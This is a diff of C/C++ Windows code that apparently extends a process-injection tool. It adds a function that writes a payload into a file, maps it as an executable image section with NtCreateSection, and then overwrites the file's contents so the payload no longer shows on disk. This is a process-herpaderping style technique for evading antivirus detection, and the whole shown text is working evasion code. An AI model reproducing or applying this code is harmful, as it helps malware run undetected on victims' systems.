@@ -96,3 +96,77 @@ HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf,
 
     return hSection;
 }
+
+
+void ClearContent(HANDLE hTargetFile) {
+
+    // overwrite the payload
+    printf("[+] Overwriting file content\n");
+
+    // replace with whitespace
+    const char* data = "\x0A";
+    DWORD dwTargetAux, dwTargetOriginalSize, dwTargetFileSize = GetFileSize(hTargetFile, &dwTargetAux) - 4;
+    DWORD bytesRemaining = dwTargetFileSize - sizeof(data);
+
+    SetFilePointer(hTargetFile, 0, NULL, 0);
+    while (bytesRemaining > sizeof(data)) {
+        DWORD bytesWritten;
+        WriteFile(hTargetFile, data, sizeof(data), &bytesWritten, NULL);
+        SetFilePointer(hTargetFile, 0, NULL, 1);
+        bytesRemaining = bytesRemaining - bytesWritten;
+    }
+
+
+    return;
+}
+
+
+HANDLE make_section_from_overwrite_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize)
+{
+    HANDLE hOverwriteFile = open_file(filePath);
+    if (!hOverwriteFile || hOverwriteFile == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to create file" << std::dec << GetLastError() << std::endl;
+        return INVALID_HANDLE_VALUE;
+    }
+    NTSTATUS status = 0;
+    IO_STATUS_BLOCK status_block = { 0 };
+
+    LARGE_INTEGER ByteOffset = { 0 };
+
+    status = NtWriteFile(
+        hOverwriteFile,
+        NULL,
+        NULL,
+        NULL,
+        &status_block,
+        payladBuf,
+        payloadSize,
+        &ByteOffset,
+        NULL
+    );
+    if (!NT_SUCCESS(status)) {
+        DWORD err = GetLastError();
+        std::cerr << "Failed writing payload! Error: " << std::hex << err << std::endl;
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hSection = nullptr;
+    status = NtCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL,
+        0,
+        PAGE_READONLY,
+        SEC_IMAGE,
+        hOverwriteFile
+    );
+    if (status != STATUS_SUCCESS) {
+        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
+        return INVALID_HANDLE_VALUE;
+    }
+    ClearContent(hOverwriteFile);
+    NtClose(hOverwriteFile);
+    hOverwriteFile = nullptr;
+
+    return hSection;
+}
